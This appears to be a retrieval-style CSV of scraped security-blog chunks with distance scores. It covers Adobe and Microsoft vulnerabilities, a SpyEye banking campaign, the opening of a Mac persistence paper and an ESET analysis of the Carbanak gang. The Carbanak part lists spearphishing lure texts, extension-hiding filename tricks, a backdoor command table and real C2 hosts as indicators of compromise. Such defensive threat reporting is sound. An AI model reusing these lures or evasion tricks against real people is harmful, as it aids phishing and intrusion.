data,distance
"Adobe, Javascript, and the CVE‑2009‑4324 Exploit
There has been quite a lot of traffic in the last few weeks about the doc.media.newPlayer vulnerability referenced in the CVE database as CVE-2009-4324. The following Adobe articles refer: http://www.adobe.com/support/security/advisories/apsa09-07.html http://blogs.adobe.com/psirt/2009/12/new_adobe_reader_and_acrobat_v.html http://blogs.adobe.com/psirt/2009/12/security_advisory_apsa09-07_up.html Today’s article at the Internet Storm Center by Bojan Zdrnja (http://isc.sans.org/diary.html?storyid=7867) gives a lot of detail on a particularly inventive exploit of the",0.011943453416693672
David Harley,0.00885109592441069
4 Jan 2010 - 11:12AM,0.011286270577662738
There has been quite a lot of traffic in the last few weeks about the doc.media.newPlayer vulnerability referenced in the CVE database as CVE-2009-4324. The following Adobe articles refer: http://www.adobe.com/support/security/advisories/apsa09-07.html http://blogs.adobe.com/psirt/2009/12/new_adobe_reader_and_acrobat_v.html http://blogs.adobe.com/psirt/2009/12/security_advisory_apsa09-07_up.html Today’s article at the Internet Storm Center by Bojan Zdrnja (http://isc.sans.org/diary.html?storyid=7867) gives a lot of detail on a particularly inventive exploit of the,0.010421866931361046
There has been quite a lot of traffic in the last few weeks about the doc.media.newPlayer vulnerability referenced in the CVE database as CVE-2009-4324. The following Adobe articles refer:,0.010297683874716523
"http://www.adobe.com/support/security/advisories/apsa09-07.html
http://blogs.adobe.com/psirt/2009/12/new_adobe_reader_and_acrobat_v.html
http://blogs.adobe.com/psirt/2009/12/security_advisory_apsa09-07_up.html",0.016174380812594036
"Today’s article at the Internet Storm Center by Bojan Zdrnja (http://isc.sans.org/diary.html?storyid=7867) gives a lot of detail on a particularly inventive exploit of the vulnerability. I won’t attempt to replicate the post here, but it includes several interesting features. The latest news from Adobe is that a patch will be made available on 12th January.",0.012031594479595453
"However, the point I do want to emphasise is this: once again, this exploit takes the easy route by making use of Adobe’s insistence on making the use of Javascript a default. As both Randy and I have pointed out several times before (most recently in Randy’s blog at http://www.eset.com/threat-center/blog/2009/12/18/pdf-%e2%80%93-pretty-darned-fatal), Javascript would be unnecessary for most end users even if it didn’t entail any added risk. However, the fact that it has been the channel for so many attacks in the past year or two tells us that it does entail significant risk. I would therefore suggest that you need to consider the following issues:",0.00966038181722051
"If you’re using Adobe Reader and/or Acrobat, you need to ensure that this patch (and other patches) are applied as soon as possible after they become available.
Note that Adobe’s patching practice is not yet as timely or as transparent as it ought to be: if you don’t have administrative privileges (which is good practice in terms of the “principle of least privilege”, you may not even receive notice of the availability of a patch, let alone be able to install it. Adobe really need to learn from Microsoft in this respect, and others…
If you’ve taken our advice to disable Javascript unless you know you need it, you might want to check that it hasn’t been re-enabled! If you haven’t disabled it, you should consider it. Seriously.
In view of Adobe’s habit of making it as difficult as possible to use the product with reasonable security, are you sure you need to use Reader? (I understand that you might find it less than convenient to dispense with full-blow Acrobat for business use.) While I wouldn’t care to recommend any particular alternative product without doing some comparative research, it has to be worth considering alternatives such as Foxit and Sumatra, or one of the cheaper PDF generation programs.",0.013955590748154223
"This issue does confirm another point we’ve made several times: while we expect the bad guys to continue looking for and exploiting vulnerabilities in operating systems, application vulnerabilities tend to offer richer seams for exploitation nowadays. It’s not Adobe’s fault that its products are so regularly targeted, but the company’s reluctance to commit to best patching practice is a real problem.",0.009385102218138375
"David Harley
Director of Malware Intelligence
",0.009035364589518369
"Microsoft fixes drop in number for October, 2019 updates",0.00941990204633314
A relatively low number of vulnerabilities were addressed in this month's Windows update rollups,0.010053922046938668
"Written by
SophosLabs Offensive Security",0.008622298185940958
"October 09, 2019",0.008932690968819768
SophosLabs Uncut Threat Research Adobe Chakra ChakraCore Edge Elevation of Privilege Exploits Microsoft Patch Tuesday updates VBscript vulnerability Windows,0.0105015635847725
"Last month started a bit overheated at Microsoft Security, when an out-of-band update was pushed for Windows in order to fix a browser bug being exploited in the wild.
However, October’s Patch Tuesday brings with it fixes for an unexpectedly low number of security vulnerabilities: 56. Of that, 20 are classified as Elevation of Privilege type of bugs, and another 14 as Remote Code Execution bugs. Notably, only 9 of this month’s fixed vulnerabilities are branded critical. Here is some highlights:",0.008935800924198878
"Remote Desktop Client Remote Code Execution
CVE-2019-1333
We and the computer security press covered RDP (Remote Desktop Protocol) vulnerabilities extensively a few months ago, due to the RDP Server vulnerability “BlueKeep” fixed in this year’s May Patch Tuesday.
This month, Microsoft fixed another bug in RDP, but this time the affected component here is the client side of RDP, whereas previous fixes (such as the one that addressed the BlueKeep vulnerability) targeted the server components. A bug that affects the client-side of RDP means a system is only in danger of being compromised if a user runs the RDP client (the “mstsc.exe” command) to establish a connection to a malicious RDP server set up by an attacker.
When you consider how unlikely it is that such an attack can succeed, it can be safely deemed a low impact bug.
Internet Explorer / Chakra / VBScript Remote Code Execution
CVE-2019-1060, CVE-2019-1238, CVE-2019-1239, CVE-2019-1307, CVE-2019-1308, CVE-2019-1335, CVE-2019-1366, CVE-2019-1371
Adding to the Internet Explorer bug fixed in the out-of-band update, 8 bugs involving Microsoft browsers have been fixed in this rollup: 3 in VBScript, 1 in Internet Explorer, and 4 in Chakra (Edge).
Win32k Elevation of Privilege
CVE-2019-1362
One of the 20 vulnerabilities classified as Elevation of Privilege (EoP), CVE-2019-1362 is a memory corruption vulnerability in Win32k – the Kernel-mode side of the Windows graphical component.
In theory, an exploit around an EoP vulnerability could permit an attacker (with limited access to a system) to gain more control over it. When you augment a browser exploit with an EoP exploit, it becomes especially dangerous – it can be used as a “sandbox escape,” breaking the measures put in place to limit the damage a browser exploit alone might cause.
Sophos coverage
Sophos has released following detection to address the vulnerabilities mentioned above.   Please note that additional vulnerabilities and corresponding detection may be released in the future.",0.010364126527587003
"CVE
SAV
IPS",0.009183097362180814
"CVE-2019-1335
Exp/20191335-A
sid:2200885",0.009630226545067955
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. Please note that some detection might not be available due to the availability of the data.",0.010783508465219027
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
New Zero-Day exploit – Astaro blocks that!,0.008139395748372857
"Dan Goodwin recently reported that a new Internet Explorer exploit has been released into the wild. The exploit, known as CVE-2010-0249, attacks a known vulnerability in Internet Explorer and was most notably used to compromise Google. Luckily, networks with an Astaro Security Gateway are protected against this threat.",0.010840863149508606
"Written by
Angelo Comazzetto",0.008855311348334505
"January 20, 2010",0.009590551599885533
Network up2date,0.007611986957109407
"Dan Goodwin recently reported that a new Internet Explorer exploit has been released into the wild. The exploit, known as CVE-2010-0249, attacks a known vulnerability in Internet Explorer and was most notably used to compromise Google.  Luckily, networks with an Astaro Security Gateway are protected against this threat.",0.010840863149508606
"Astaro is connected to the Microsoft Active Protection Program and therefore it is possible for the product’s IPS to recognize and block attacks before other vendors are able to do so.
According to the Goodwin article, this attack has been in existence and remained undetected for almost nine years.  Obviously this attack is ""highly sophisticated"" and the only reason we are aware of the exploit now is because a very prominent company (Google), was targeted and compromised.  It is important to note that Internet Explorer version 8 and Windows 7 were both able to withstand this attack- once again confirming the importance of updating your software.
Microsoft is encouraging Internet Explorer users to upgrade version 8, a move that will help protect users from other known vulnerabilities. I believe the Google compromise is just the tip of the iceberg. Just because we are now aware of this exploit does not mean all networks and systems are fixed. Now that the vulnerability in Internet Explorer has been publicized we can expect more attacks looking to take advantage of the vulnerability until a patch is made.
The next patch is scheduled for February 9th, however there is speculation a patch may be issued prior to the scheduled patch date. A final thought about this exploit is how it transcends international borders. The cyber-criminals who created this exploit are from China but used the global reach of Internet Explorer to gain access to email accounts of users who trust Google from all over the world. We truly live in a global world.",0.01641002711469408
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Adobe rushes to patch Flash flaw under attack
Adobe Systems has issued a sizeable security update with patches for 36 vulnerabilities, at least one of which is currently under attack in the wild.",0.013849296934216992
9 Jul 2015 - 03:47PM,0.011454564682619628
"Adobe Systems has issued a sizeable security update with patches for 36 vulnerabilities, at least one of which is currently under attack in the wild.",0.013829548789503487
"Adobe Systems has issued a sizeable security update with patches for 36 vulnerabilities, at least one of which is currently under attack in the wild.",0.013829548789503487
"The most critical flaw, CVE-2015-5119, could lead to code execution, as Adobe’s accompanying Bulletin states: “These updates address critical vulnerabilities that could potentially allow an attacker to take control of the affected system. Adobe is aware of a report that an exploit targeting CVE-2015-5119 has been publicly published.”",0.010577685522127456
"PC World reports that the flaw has already been integrated into three commercial exploit kits: Angler, Neutrino and Nuclear Pack.",0.015809018140481412
"It’s been reported that the flaw was included in the 400GB dump that hackers claim was stolen from the “Hacking Team” security company. As We Live Security reported recently, in spite of the claims, it has yet to to be proven that this data is legitimate.",0.01165227231050503
"The other updates include fixes that resolve heap buffer overflow vulnerabilities that could lead to code execution (CVE-2015-3135, CVE-2015-4432, CVE-2015-5118), and updates that resolve memory corruption vulnerabilities that could lead to code execution (CVE-2015-3117, CVE-2015-3123, CVE-2015-3130, CVE-2015-3133, CVE-2015-3134,CVE-2015-4431).",0.01111005483112626
"Adobe’s Flash Player updates are available for Mac, Windows and Linux. Flash users running Mac OS X and Windows computers should update to Adobe Flash Player 18.0.0.203 (15.6 MB) immediately to avoid potential attacks. Linux users should update to Flash Player 11.2.202.481.",0.019846704279160465
"It’s been a difficult six months for Adobe’s security team, which already had to patch a string of serious vulnerabilities earlier this year.
",0.01311098618162354
"Carbanak gang is back and packing new guns
A few days ago, CSIS published details about new Carbanak samples found in the wild. In this blog we examine the latest developments in the Carbanak story.",0.018168395098601464
Anton Cherepanov,0.012177145254436028
8 Sep 2015 - 10:49AM,0.011035175646994855
"A few days ago, CSIS published details about new Carbanak samples found in the wild. In this blog we examine the latest developments in the Carbanak story.",0.017437084618507348
"The Carbanak financial APT group made the headlines when Group-IB and Fox-IT broke the news in December 2014, followed by the Kaspersky report in February 2015. The two reports describe the same cybercriminal gang which stole up to several hundreds of millions of dollars from various financial institutions.",0.015957474366331548
"However, the story is interesting not only because of the large amount of money stolen but also from a technical point of view. The Carbanak team does not just blindly compromise large numbers of computers and try to ‘milk the cow’ as other actors do, instead they act like a mature APT-group. They only compromise specific high-value targets and once inside the company networks, move laterally to hosts that can be monetized.",0.01298696074580119
A few days ago CSIS published details about new Carbanak samples found in the wild.,0.02133493655059604
In this blog we will describe the latest developments in the Carbanak story.,0.01979000855931612
Casino hotel hack,0.008077956105811634
"At the end of August, we detected an attempt to compromise the network of a casino hotel in the USA. The infection vector used in this attack may have been a spearphishing e-mail with a malicious attachment using an RTF-exploit or .SCR file. The attackers’ aim was to compromise PoS servers used in payment processing.",0.00937081400652473
"The main backdoor used by attackers was the open-source Tiny Meterpreter. In this case, however, the source was modified – the process injection to svchost.exe was added to its functionality.",0.00979042715034184
This Tiny Meterpreter backdoor dropped two different malware families:,0.008715469749904559
"Win32/Spy.Sekur – well known malware used by the Carbanak gang
Win32/Wemosis – a PoS RAM Scraper backdoor",0.009467017613456807
"As mentioned here by our colleagues from TrendMicro, Carbanak malware is capable of targeting Epicor/NSB PoS systems, while Win32/Wemosis is a general-purpose PoS RAM Scraper which targets any PoS that stores card data in the memory. The Wemosis backdoor is written in Delphi and allows the attacker to control an infected computer remotely.",0.010299553120795557
Both executables were digitally signed with the same certificate:,0.008473268770935571
The certificate details:,0.008025088831948635
"Company name: Blik
Validity: from 02 October 2014 to 03 October 2015
Thumbprint: ‎0d0971b6735265b28f39c1f015518768e375e2a3
Serial number: ‎00d95d2caa093bf43a029f7e2916eae7fb
Subject: CN = Blik
O = Blik
STREET = Berzarina, 7, 1
L = Moscow
S = Moscow
PostalCode = 123298
C = RU",0.01233721433844237
This certificate was also used in the digital signature of a third malware family used by the same gang: Win32/Spy.Agent.ORM.,0.015565564744518756
Win32/Spy.Agent.ORM – overview,0.00849548048173554
"Win32/Spy.Agent.ORM (also known as Win32/Toshliph) is a trojan used as one of their first-stage payloads by the Carbanak gang. The binary of the testing version was signed with a Blik certificate: moreover, Spy.Agent.ORM shares some similarities in the code with “the regular” Carbanak malware.",0.016934496366827645
"The Win32/Spy.Agent.ORM malware family is already known in the industry because of two blogposts. In July 2015 security company Cyphort reported the compromise of a news portal and a banking site – rbc.ua and unicredit.ua. It turns out that the compromised sites served Win32/Spy.Agent.ORM. After that, Blue Coat reported a spearphishing attempt targeting Central Bank of Armenia employees, the payload being the same.",0.010506851990704225
"This malware appeared on our radar at the beginning of summer 2015, and afterwards we started to track it.",0.016676426661730637
We have seen attempts to attack various companies in Russia and Ukraine using spearphishing e-mails that have malicious attachments consisting of .SCR files or .RTF exploits.,0.018724453942557062
Here is an example of a spearphishing email sent to one of the biggest Forex-trading companies:,0.010737566880415383
"Roughly translated from Russian to English, it says:",0.011932765402627221
“Due to the high volatility of the ruble exchange rate the Bank of Russia sends rules of trading on the currency market. Password the attached document: cbr”,0.011293902804282552
Here is another example of a spear phishing attempt. Email with this text was sent to the largest electronic payment service in Russia:,0.015332470505876161
Постановлением Роскомнадзора от 04.08.2015г. Вам необходимо заблокировать материалы попадающие под Федеральный закон от 27.07.2006 N 152-ФЗ (ред. от 21.07.2014) “О персональных данных”. Перечень материалов в документе.,0.029177975385679678
Пароль roscomnadzor,0.018987758512796993
Another rough translation from Russian to English:,0.011223945992775652
"“According to Roscomnadzor prescript you should block the materials, which you can find in the attachment. Password is roscomnadzor”",0.008895091776537467
We have seen similar .SCR files with following filenames:,0.00998433537056942
"АО «АЛЬФА-БАНК» ДОГОВОР.scr (Alfabank contract)
Перечень материалов для блокировки от 04.08.2015г.scr (List to block)
Postanovlene_ob_ustranenii_18.08.2015.pdf %LOTS_OF_SPACES% ..scr
Правила Банка России от 06.08.2015.pdf %LOTS_OF_SPACES% .scr (Rules of Bank of Russia)",0.027494101457341436
All these attachments contained a password protected archive with .SCR file. The files had Adobe Acrobat reader icon or MS Word icons.,0.01226160795626785
"In other cases attackers used RTF files with different exploits, including an exploit for one of the latest Microsoft Office vulnerabilities, CVE-2015-1770, which was patched by Microsoft in June 2015 in MS15-059.",0.012961582210259337
We have seen RTF files with the following names used in attacks:,0.008512257062315398
"prikaz-451.doc
REMITTANCE ADVICE ON REJECTION.doc
PROOF OF REMITTANCE ADVICE .doc
HDHS739_230715_010711_A17C7148_INTERNAL.doc
Բանկերի և բանկային գործունեության մասին ՀՀ օրենք 27.07.2015.doc (Armenian: The Law on Banks and Banking 27.07.2015)
PAYMENT DETAILS.doc
АО «АЛЬФА-БАНК» ДОГОВОР.doc (Russian: Alpha-bank contract)
AML REPORTS_20082015_APPLICATION FORM-USD-MR VYDIAR.doc
Anti-Money Laudering & Suspicious cases.doc
ApplicationXformXUSDXduplicateXpayment.doc
AML USD & Suspicious cases.doc
Amendment inquiry ( reference TF1518869100.doc
Information 2.doc",0.015493302256061603
Here is example of a spearphishing message that was sent to a bank in the United Arab Emirates:,0.011123237337619551
Here is example of a spearphishing email that was sent to a German bank:,0.010342323235471573
Win32/Spy.Agent.ORM – Technical details,0.008216520679348305
"Win32/Spy.Agent.ORM is a small and simple backdoor that enables the attackers to assess the victim. When executed the trojan connects to a C&C server and receives commands to grab screenshots, enumerate running processes and get information about the system and campaign ID. Based on that information malware operator decides whether the infected computer is useful: that is, whether it’s the intended target or just a system that was accidentally infected.",0.010534899881383564
Here is list of commands that it can receive from C&C server:,0.008103422053172049
"Command
Purpose",0.008480682605560563
"0x02
Collects information about computer: Computer Name, User Name, Windows Version, Architecture (32/64 bit) and campaign ID",0.011897247826462842
"0x03
Collects list of running processes",0.009526244696325348
"0x04
Downloads binary to %TEMP% and executes",0.00840833103803773
"0x05
Updates itself",0.008627630740151826
"0x06
Deletes itself",0.008369201247420688
"0x07
Makes screenshot",0.007960810930907503
"0x08
Loads binary in the memory, without dropping to the disk",0.008485132322819222
The latest sample of this malware family found in the wild is also digitally signed with a different certificate:,0.009825928597330225
The certificate details:,0.008025088831948635
"Company name: In travel TOV
Validity: from 21 July 2015 to 21 July 2016
Thumbprint: ‎7809fbd8d24949124283b9ff14d12da497d9c724
Serial number: 00dfd915e32c5f3181a0cdf0aff50f8052
Subject: CN = In travel TOV
O = In travel TOV
STREET = prospekt Pravdi 33
L = Kiev
S = Kievskaja
PostalCode = 04108
C = UA",0.01061017057884417
"Also, the latest sample is able to gain system privileges via an exploit and install itself as a system service. The trojan attempts to exploit a vulnerability – CVE-2015-2426 in the OpenType manager module (ATMFD.dll) – which was patched by Microsoft in MS15-078. The exploit for this vulnerability was leaked in a Hacking Team dump.",0.006681739317852875
"The digital certificate for Blik used in this case is not the only link between Win32/Spy.Agent.ORM and Win32/Spy.Sekur (Carbanak malware). They share similarities in code – take a look at the function that generates the BOTID-value, for example:",0.014322654515635302
"The BOTID-value is a unique value generated on the basis of the hardware parameters of infected computer, and it’s used by attackers for computer identification. In both cases generation is based on the MAC-address and computer name and the resulting value is formatted using the wsprintf –function.",0.009391657369353656
Sinkhole statistics,0.008889156565690226
Our sinkhole of some C&C domains used by the Win32/Wemosis has resulted in hits from bots in the following countries.,0.013721631814189728
"As the attacks are highly targeted, the total number of victims is low in absolute numbers. Victims in the USA are situated in several states, including Nevada (Las Vegas), California, and New York, and include casinos and hotels.",0.017632753143641544
Conclusions,0.009304842168474714
"Even after it has reportedly stolen hundreds of millions of dollars, the infamous Carbanak APT group isn’t resting on its laurels. On the contrary, it is very active and keeps attacking specific targets related to the finance industry, including banks, Forex-trading companies, and even an American casino hotel. Recently, we have detected malware used by the Carbanak group in the following countries, among others:",0.019159802412379023
"United States of America
Germany
United Arab Emirates",0.011491288932730437
"As described in this blog post, the gang doesn’t use just one malware family to carry out its operations but several. While the code in the different families – Carbanak (Win32/Spy.Sekur), Win32/Spy.Agent.ORM, and Win32/Wemosis – is different it does contain similar traits, including the same digital certificate.",0.01558186353618407
"Furthermore, the attackers are updating their arsenal with the latest exploits, such as the Microsoft Office remote code execution vulnerability, CVE-2015-1770, or the zero-day exploit leaked in the Hacking Team dumps, CVE-2015-2426.",0.009280647687364363
"We continue to monitor the Carbanak threats. For any enquiries or sample submissions related to the subject, contact as at: threatintel@eset.com.",0.018801318650596643
Indicators of Compromise (IoC),0.016978232115072545
Trojan.Win32/Spy.Sekur (Carbanak malware) SHA-1:,0.017564206968108897
"A048C093C5DA06AF148CA75299960F618F878B3A
3552338D471B7A406D8F7E264E93B848075235C0
3A9A23C01393A4046A5F38FDBAC371D5D4A282F1
8D5F2BF805A9047D58309788A3C9E8DE395469A8
BCF9E4DCE910E94739728158C98578A8D145BE56
8330BC5A3DCC52A22E50187080A60D6DBF23E7E6
E838004A216E58C44553A168760100B497E514E8
CF1F97879A6EB26FEDC7207D6679DFA221DD2D45
7267791340204020727923CC7C8D65AFC18F6F5B
F8CBF647A64028CAE835A750EF3F8D1AA216E46C
33870482BA7DE041587D4B809574B458C0673E94
3927835C620058EFCADF76642489FC13AACE305B
D678BD90257CF859C055A82B4A082F9182EB3437
0B8605D0293D04BBF610103039768CBE62E2FAAE
7A9BE31078BC9B5FECE94BC1A9F45B7DBF0FCE12",0.03360504878543147
RTF-exploits SHA-1:,0.01244798343699538
"D71E310ADF183F02E36B06D166F8E3AD54FDBCC9
5B6ABA51215A9662987F59AEF6CAE0A9E3A720B8
1AD84A244B7D4FBB4D89D023B21715B346027E49
E8514BF4C4E1F35FB1737C2F28A4A4CED07AA649
68EA12CDCCEE01D50C23EBC29CAA96BF40925DC6
AC95F01487B4F179A1F10684B1E0A5656940A005
B4A94A214FC664B8D184154431E1C5A73CA0AE63",0.02202936767776187
Trojan.Win32/Spy.Sekur C2 servers:,0.009820080051379798
"weekend-service.com:80
seven-sky.org:80
comixed.org:80
91.207.60.68:80
89.144.14.65:80
87.98.217.9:443
82.163.78.188:443
50.62.171.62:700
31.3.155.123:443
216.170.116.120:80
216.170.116.120:700
216.170.116.120:443
194.146.180.58:80
193.203.48.41:700
185.29.9.28:443
178.209.50.245:443
162.221.183.11:80
162.221.183.11:443
162.221.183.109:443
141.255.167.28:443
104.232.32.62:443
104.232.32.61:443",0.01913483270857841
Trojan.Win32/Spy.Agent.ORM SHA-1:,0.011216993213090665
"2DD485729E0402FD652CF613E172EA834B5C9077
5E8B566095FD6A98949EF5C479CE290F520DD9E2
8C2C08111F76C84C7573CF07C3D319A43180E734
36093A6004A9502079B054041BADC43C69A0BDEB
6F452C76F7AC00FE1463314F5AA0A80EC4F7360C
850E9A10E6D20D33C8D2C765E22771E8919FC3EE
A09F520DDED0D5292A5FA48E80DE02F9AF718D06
3707029DC5CBBE17FD4DE34134847F92E7324C45
905D0842CC246A772C595B8CF4A4E9E517683EB7
237784574AFB8868213C900C18A114D3FA528B95
6090853934833D0814F9239E6746161491CCCB44
3672C9F4E7F647F2AF9AE6D5EA8D9C7FF16FAF40
EC5DADAACAE763D0E55CE6A78C9A5F57B01A5135
4E8EE08FF4F8DC06AFF8DE2E476AFAFBA58BDC11
A734193F550DDA5C1FFD9FEC3A0186A0A793449C
EFC0555418A6ED641047D29178D0DA3AEFA7ADEB
B79E6A21D8C2813EC2279727746BDB685180751A
4DB58E7D0FCA8D6748E17087EB34E562B78E1FDE
567749B4F2330F02DD181C6C0840191CEE2186D9
3ACEA9477B219FC6B8C0A734E67339AE2EB2AA5B
2896814E5F8860E620AC633AF53A55D9AA21F8C0
84CC02B3C10306BFCECE8BF274B57475B056C6D6
207FF65543DAC6D1D9F86DFFD891C507AD24018B
D627DD4E3850CBD571AFC4799A331054C7080B0D
DCC932B878B374D47540D43A2DEE97F37D68267F
983D33F547588A59B53D7F794768B264454446D5
19E7C7A78C5D58945B615D98FF0990389485933F
DED83A1E3B6630D69077976CC01321FBC946DCE2
170142C042BF32FF86AF680EAD86CD1AF075B0CB
A77336620DF96642691C1E5B6C91511BFA76A5BE
3CEF1CA36A78CBA308FB29A46B20E5CA22D03289
DD01331ABFF03525506CDCBAC4D76CB4EFD602A4",0.038225815543021624
RTF-exploits SHA-1:,0.01244798343699538
"1F9462AA39645376C74566D55866F7921BD848F7
81E43D653ACD2B55C8D3107E5B50007870D84D76
AC68AD2E5F5802A6AB9E7E1C1EC7FAB3C6BDBAA4
F869C7EA683337A2249908C21B9D3283CC2DD780
7162BB61CD36ED8B7EE98CBD0BFFEC33D34DD3E7
5943ABCF662DC9634B714B1358164B65E5651D15
A40BDF005B4B469D2C7BED1766C9DA9823E1CFB7
833A8D88BE11807BAE966D56B28AF7B3CC34DBCD
AF7564EE7959142C3B0D9EB8129605C2AE582CB7
DCC932B878B374D47540D43A2DEE97F37D68267F
6FF3AE5BA4E9A312602CBD44A398A02AB0437378
32AA4911BC6AB8098E496CD88790FF7147EC6AC3",0.027441774234589378
Trojan.Win32/Spy.Agent.ORM – C2 Servers:,0.010604765780747871
"192.52.166.66
84.200.4.226
78.128.92.117
176.31.157.62
clients4-google.com (192.169.82.86)
adobe-dns-3-adobe.com (78.128.92.112)
img.in-travelusa.com (192.169.82.86)",0.017339983951148996
Tiny meterpreter SHA-1:,0.010930510883798927
"28D514FE46D8B5720FE27C40C3889F3B45967CC7
0B0884992F28A3C1439DBA60007076B22831CE51",0.012238506179247155
Win32/Wemosis (PoS RAM Scraper) SHA-1:,0.0137774356178606
5E31DB305A97736C0F419A3F2F8F093FF6A1F56F,0.010005878433819504
Win32/Wemosis – C2 server:,0.0065286527327677035
"198.100.119.14
",0.009422677660595458
"Spam campaign uses Blackhole exploit kit to install SpyEye
This article was written in collaboration with my colleague Jean-Ian Boutin. The Wigon botnet (also known as Cutwail) is being used in a massive spam campaign. A multitude of ruses are used to get the user to click on a link: fake LinkedIn or Facebook notifications, free Windows licenses, fake deliveries etc. The links are",0.012318909112078225
15 Dec 2011 - 07:58AM,0.011694612508915347
"This article was written in collaboration with my colleague Jean-Ian Boutin. The Wigon botnet (also known as Cutwail) is being used in a massive spam campaign. A multitude of ruses are used to get the user to click on a link: fake LinkedIn or Facebook notifications, free Windows licenses, fake deliveries etc. The links are",0.012270921796093903
This article was written in collaboration with my colleague Jean-Ian Boutin.,0.01711451792548313
"The Wigon botnet (also known as Cutwail) is being used in a massive spam campaign. A multitude of ruses are used to get the user to click on a link: fake LinkedIn or Facebook notifications, free Windows licenses, fake deliveries etc. The links are pointing to the Blackhole exploit kit which attempts to install malware on the computer via unpatched security flaws. The kit attempts to use the recently added exploit CVE-2011-3544 for Java. A lot of systems have not yet been patched for this vulnerability leaving them at risk of being compromised; screenshots of Blackhole panels published by french malware researchers Xylitol and Malekal show that this vulnerability account for over 80% of the succesful infections.",0.010109829296641837
CVE-2011-3544 now exploited by Blackhole,0.010374741145050215
The following screenshot shows a part of the decompiled code of the Java applet used by Blackhole which is exploiting the flaw.,0.012979892382672498
JAR file exploiting CVE-2011-3544,0.0072548509077117185
"One of the file dropped through this spam campaign is a SpyEye sample detected as Win32/Spy.SpyEye Trojan by ESET. This banking trojan was configured to steal banking information from clients of BAWAG PSK, the fourth largest bank in Austria. Once a computer is infected, the malware has the ability to change the webpages content seen by the user when visiting BAWAG eBanking services. The following screenshots show that the phishing warning as well as the bank contact information is removed from the login page by the malware .",0.011502803175208132
Phishing warnings and contact information removed by SpyEye,0.00796905369159584
"Once the user logs in, his personal information is stored and sent to the C&C server. According to the SpyEye tracker, the C&C server used by this sample is still online and is hosted in Azerbaijan.",0.011940290416075583
An obfuscated JavaScript is inserted in the eBanking webpage and is used to transfer money from the user account to the cybercriminal account. This script has also the ability to hide operations that were done on the user account by modifying the content of the account balance and transfer history. The following screenshot shows a code snippet used to modify the account balance in order to hide a transfer that has already occurred.,0.011073236937053643
"Finally, here is a screenshot showing the code used to send status information when a successful transfer occurs.",0.010618860895419191
BAWAG PSK has been notified of this targeted attack. As always we advise our readers not to click links in spam or suspicious messages and to keep their installed software and antivirus up to date.,0.01023189969728544
"SpyEye sample MD5 Hash : 4c5698ea403be8300d26dbc6bb16f302
",0.009442854457831218
"VB2014 paper: Methods of malware persistence on Mac OS X
2014-10-26",0.009461320262576178
"Patrick Wardle
Synack
,
USA
Editor:
Martijn",0.011752798638704487
"Grooten
Abstract
As Mac OS X continues to increase in popularity, OS X malware is becoming more common than ever. In his VB2014 paper, Patrick Wardle presents a detailed analysis of Apple’s anti-malware mechanisms (revealing several significant weaknesses), before diving into the bowels of the Mac startup process and detailing points of persistence. He also examines examples of OS X malware to illustrate how code may abuse the OS in order to achieve reboot persistence. Finally, he discusses a novel open-source tool that can enumerate and display persistent OS X binaries that are set to execute automatically upon reboot.
Copyright © 2014 Virus Bulletin",0.010173267099792715
"Abstract
As Mac OS X continues to increase in popularity, OS X malware (once a rare phenomenon) is now more common than ever. Therefore, it is essential for cybersecurity and malware analysts to possess an in-depth understanding of OS X and how it may be attacked by persistent, malicious code.
This paper presents a detailed analysis of Apple’s anti-malware mechanisms (revealing several significant weaknesses), before diving into the bowels of the Mac startup process. Here, points of persistence are detailed comprehensively. Following this, examples of OS X malware are examined to illustrate how code may abuse the OS in order to achieve reboot persistence.
Finally, a novel open-¬source tool is discussed that can enumerate and display persistent OS X binaries that are set to execute automatically upon reboot. Armed with such a tool, users can ensure that they are protected against both current and future persistent OS X threats.",0.012763590786944556
"Background
Before diving into methods of persistence abused by OS X malware, it is important to understand why such a topic is truly relevant.
As is obvious to even the most naïve amongst us, Macs have become more prevalent than ever. According to a recent study by the International Data Corporation (IDC), Apple is now the number three US computer vendor, making up almost 15% of computer sales [1]. Moreover, if ‘iDevices’ (iPhones, iPads, etc.) are added to the equation, Apple devices outsold Windows PCs globally in Q4 of 2013 [2].
Figure 1. Mac’s growth 2009–2013.
One of the driving forces behind the increased adoption of Apple computers is the notion that OS X is immune to malware. This claim was propagated by Apple, who claimed ‘[Mac OS X] doesn’t get PC viruses. A Mac isn’t susceptible to the thousands of viruses plaguing Windows-based computers’ [3].
Ironically, the first personal computer virus discovered in the wild (Elk Cloner), was a Mac virus that infected Apple IIs [4]. Since then, Mac malware has flourished. Just last year, over 30 new OS X malware families were discovered, some infecting the corporate systems of companies such as Apple, Facebook, and Twitter [5], [6].",0.014993017878308756
"Apple's anti-malware enhancements and their flaws
In recent versions of OS X, Apple has introduced a myriad of security enhancements which aim to thwart malware. Examples of these enhancements include: XProtect (Apple’s built-in anti virus solution), Gatekeeper (which verifies downloaded software), sandboxing (which prevents Mac Store applications from accessing OS-level components), and signed-code requirements (where signatures are verified and only signed kernel extensions can be loaded). While these are spun by Apple’s marketing team as proactive security measures, in reality they are more reactive and act as an acknowledgement of the OS X malware problem. Moreover, while they are a step in the right direction, many of these security enhancements are trivial to bypass.",0.01240931227311226
"XProtect
Apple’s attempt at an anti-virus product is internally referred to as XProtect. Implemented within the CoreServicesUIAgent, it uses signatures from /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/XProtect.plist to detect OS X malware.
Figure 2 shows an entry from the XProtect signature file.
Figure 2. XProtect’s signature for LaoShu.A.
The highlighted entry in Figure 2 aims to detect the OSX/LaoShu.A malware by matching a SHA1 hash and a filename (‘worty’). While the benefit of such an exact match/detection scheme is zero false positives, there are several major downsides. For one, a slight change in the malware (the renaming of a file, or a recompilation to change the hash), will prevent a match, and thus detection, from being made. The malware will remain undetected and will be able to execute. Another obvious downside to XProtect’s signature-based malware detection scheme is that new malware will never be detected.
Besides the weaknesses in the detection scheme used by XProtect, it is plagued by other design issues. In its current implementation, XProtect only scans binaries that contain a quarantine attribute. This attribute is set by the application that downloaded the binary (e.g. a browser), not the OS. This is problematic, as an exploit-based attack that manually downloads malware will, of course, do so without setting the quarantine attribute. As such, these binaries will not be scanned, allowing downloaded malware to execute without fear of detection.",0.011702151325253096
"Gatekeeper
According to Apple, Gatekeeper helps protect Macs from malicious apps that are downloaded and installed from the Internet [6].
Figure 3. Gatekeeper in action.
